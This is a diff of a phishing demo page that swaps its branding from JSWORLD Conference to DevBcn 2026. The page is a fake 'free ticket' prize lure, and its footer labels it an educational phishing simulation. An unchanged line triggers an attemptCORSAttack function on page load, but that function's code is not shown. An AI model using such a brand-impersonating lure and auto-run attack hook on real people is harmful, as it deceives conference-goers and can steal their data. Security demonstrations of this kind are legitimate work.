@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 You've Won a Free Ticket to JSWORLD Conference 2026!</title>
+    <title>🎉 You've Won a Free Ticket to DevBcn 2026!</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 
@@ -11,7 +11,7 @@
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #0a0a0a;
+            background: #050d1a;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -20,23 +20,23 @@
         }
 
         .card {
-            background: #141414;
+            background: #0a1628;
             border-radius: 16px;
-            border: 1px solid #242424;
+            border: 1px solid #162540;
             max-width: 560px;
             width: 100%;
             overflow: hidden;
-            box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03);
+            box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(45,155,240,0.05);
         }
 
         /* ── Header ── */
         .header {
-            background: #0f0f0f;
+            background: #080f1e;
             padding: 20px 32px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            border-bottom: 1px solid #1f1f1f;
+            border-bottom: 1px solid #0e2040;
         }
 
         .logo-row {
@@ -45,9 +45,14 @@
             gap: 14px;
         }
 
-        .logo-row img {
-            height: 40px;
-            width: auto;
+        .logo-mark {
+            background: linear-gradient(135deg, #1a6fba, #2d9bf0);
+            color: #fff;
+            font-weight: 900;
+            font-size: 0.95em;
+            letter-spacing: -0.5px;
+            padding: 6px 12px;
+            border-radius: 6px;
         }
 
         .logo-label {
@@ -57,10 +62,10 @@
             letter-spacing: 0.3px;
         }
 
-        .logo-label span { color: #A01822; }
+        .logo-label span { color: #2d9bf0; }
 
         .nav-link {
-            color: #555;
+            color: #2a4a70;
             font-size: 0.78em;
             font-weight: 500;
             text-decoration: none;
@@ -69,8 +74,8 @@
 
         /* ── Hero banner ── */
         .hero {
-            background: linear-gradient(160deg, #1a0608 0%, #2a0a0e 50%, #1a0608 100%);
-            border-bottom: 1px solid #3a0a0e;
+            background: linear-gradient(160deg, #061020 0%, #0a1e3a 50%, #061020 100%);
+            border-bottom: 1px solid #0e2a4a;
             padding: 36px 32px 32px;
             text-align: center;
             position: relative;
@@ -81,15 +86,15 @@
             content: '';
             position: absolute;
             inset: 0;
-            background: radial-gradient(ellipse at 50% -20%, rgba(160,24,34,0.35) 0%, transparent 65%);
+            background: radial-gradient(ellipse at 50% -20%, rgba(26,111,186,0.4) 0%, transparent 65%);
             pointer-events: none;
         }
 
         .hero-eyebrow {
             display: inline-block;
-            background: rgba(160,24,34,0.25);
-            border: 1px solid rgba(160,24,34,0.5);
-            color: #e05060;
+            background: rgba(26,111,186,0.2);
+            border: 1px solid rgba(45,155,240,0.45);
+            color: #60b8f0;
             font-size: 0.7em;
             font-weight: 700;
             letter-spacing: 2px;
@@ -109,7 +114,7 @@
         }
 
         .hero p {
-            color: #888;
+            color: #5a7a9a;
             font-size: 0.9em;
             font-weight: 400;
         }
@@ -120,16 +125,16 @@
         }
 
         .ticket {
-            background: #0f0f0f;
+            background: #080f1e;
             border-radius: 10px;
-            border: 1px solid #242424;
+            border: 1px solid #162540;
             overflow: hidden;
             position: relative;
         }
 
         .ticket-top {
             padding: 22px 24px;
-            border-bottom: 1px dashed #2a2a2a;
+            border-bottom: 1px dashed #162540;
             display: flex;
             justify-content: space-between;
             align-items: flex-start;
@@ -143,12 +148,12 @@
         }
 
         .ticket-year {
-            color: #A01822;
+            color: #2d9bf0;
             font-weight: 900;
         }
 
         .ticket-pill {
-            background: #A01822;
+            background: #1a6fba;
             color: #fff;
             font-size: 0.65em;
             font-weight: 700;
@@ -171,20 +176,20 @@
             font-size: 0.65em;
             text-transform: uppercase;
             letter-spacing: 2px;
-            color: #444;
+            color: #243550;
             margin-bottom: 5px;
             font-weight: 600;
         }
 
         .ticket-field .val {
-            color: #e0e0e0;
+            color: #c0d8f0;
             font-weight: 600;
             font-size: 0.9em;
         }
 
         .ticket-divider {
             height: 1px;
-            background: linear-gradient(90deg, transparent, #242424 20%, #242424 80%, transparent);
+            background: linear-gradient(90deg, transparent, #162540 20%, #162540 80%, transparent);
             margin: 0 24px;
         }
 
@@ -197,13 +202,13 @@
 
         .ticket-id {
             font-size: 0.68em;
-            color: #333;
+            color: #1e3050;
             font-family: 'Courier New', monospace;
             letter-spacing: 1px;
         }
 
         .ticket-value {
-            color: #A01822;
+            color: #2d9bf0;
             font-size: 1.1em;
             font-weight: 900;
             letter-spacing: -0.5px;
@@ -217,8 +222,8 @@
             width: 16px;
             height: 16px;
             border-radius: 50%;
-            background: #141414;
-            border: 1px solid #242424;
+            background: #0a1628;
+            border: 1px solid #162540;
             top: 50%;
             transform: translateY(-50%);
         }
@@ -234,7 +239,7 @@
         .cta-btn {
             display: block;
             width: 100%;
-            background: linear-gradient(135deg, #8B1018 0%, #A01822 50%, #B52030 100%);
+            background: linear-gradient(135deg, #1258a0 0%, #1a6fba 50%, #2d9bf0 100%);
             color: #ffffff;
             border: none;
             padding: 15px 24px;
@@ -244,12 +249,12 @@
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 1.5px;
-            box-shadow: 0 4px 20px rgba(160,24,34,0.35);
+            box-shadow: 0 4px 20px rgba(26,111,186,0.4);
             transition: box-shadow 0.2s, transform 0.1s;
         }
 
         .cta-btn:hover {
-            box-shadow: 0 6px 28px rgba(160,24,34,0.5);
+            box-shadow: 0 6px 28px rgba(45,155,240,0.55);
             transform: translateY(-1px);
         }
 
@@ -259,23 +264,23 @@
 
         .cta-note {
             text-align: center;
-            color: #3a3a3a;
+            color: #1e3050;
             font-size: 0.72em;
             margin-top: 12px;
         }
 
         /* ── Footer ── */
         .footer {
-            background: #0f0f0f;
-            border-top: 1px solid #1f1f1f;
+            background: #080f1e;
+            border-top: 1px solid #0e2040;
             padding: 14px 32px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .footer-brand { color: #333; font-size: 0.75em; }
-        .footer-disclaimer { color: #222; font-size: 0.68em; }
+        .footer-brand { color: #1e3050; font-size: 0.75em; }
+        .footer-disclaimer { color: #131e30; font-size: 0.68em; }
     </style>
 </head>
 <body>
@@ -283,45 +288,45 @@
 
         <div class="header">
             <div class="logo-row">
-                <img src="https://assets.jsworldconference.com/logo_jsworld_ad7f539826.svg" alt="JSWORLD" />
-                <div class="logo-label">JSWORLD <span>Conference</span></div>
+                <div class="logo-mark">dev<span style="opacity:0.7">bcn</span></div>
+                <div class="logo-label">DevBcn <span>2026</span></div>
             </div>
-            <a class="nav-link" href="#">jsworldconference.com</a>
+            <a class="nav-link" href="#">devbcn.com</a>
         </div>
 
         <div class="hero">
             <div class="hero-eyebrow">🎫 Winner Selected</div>
-            <h1>You've won a free ticket<br>to JSWORLD 2026</h1>
+            <h1>You've won a free ticket<br>to DevBcn 2026</h1>
             <p>Your complimentary full-access pass has been reserved</p>
         </div>
 
         <div class="ticket-wrap">
             <div class="ticket">
                 <div class="ticket-top">
-                    <div class="ticket-event">JSWORLD <span class="ticket-year">2026</span></div>
+                    <div class="ticket-event">DevBcn <span class="ticket-year">2026</span></div>
                     <div class="ticket-pill">Full Pass · Complimentary</div>
                 </div>
                 <div class="ticket-body">
                     <div class="ticket-field">
                         <label>Date</label>
-                        <div class="val">May 7–8, 2026</div>
+                        <div class="val">June 16–17, 2026</div>
                     </div>
                     <div class="ticket-field">
                         <label>Venue</label>
-                        <div class="val">RAI Amsterdam</div>
+                        <div class="val">World Trade Center</div>
                     </div>
                     <div class="ticket-field">
                         <label>Location</label>
-                        <div class="val">Amsterdam, Netherlands</div>
+                        <div class="val">Barcelona, Spain</div>
                     </div>
                     <div class="ticket-field">
                         <label>Attendance</label>
-                        <div class="val">2,000+ attendees</div>
+                        <div class="val">1,000+ attendees</div>
                     </div>
                 </div>
                 <div class="ticket-divider"></div>
                 <div class="ticket-footer">
-                    <div class="ticket-id">TKT-2026-JSWORLD-FREE</div>
+                    <div class="ticket-id">TKT-2026-DEVBCN-FREE</div>
                     <div class="ticket-value">€499 value</div>
                 </div>
             </div>
@@ -335,7 +340,7 @@
         </div>
 
         <div class="footer">
-            <div class="footer-brand">jsworldconference.com</div>
+            <div class="footer-brand">devbcn.com</div>
             <div class="footer-disclaimer">Educational demo — phishing simulation</div>
         </div>
 
@@ -375,7 +380,7 @@
         window.addEventListener('load', () => setTimeout(attemptCORSAttack, 1000));
 
         function createConfetti() {
-            const colors = ['#A01822', '#B52030', '#e05060', '#ffffff'];
+            const colors = ['#1a6fba', '#2d9bf0', '#60b8f0', '#ffffff'];
             for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
                     const el = document.createElement('div');
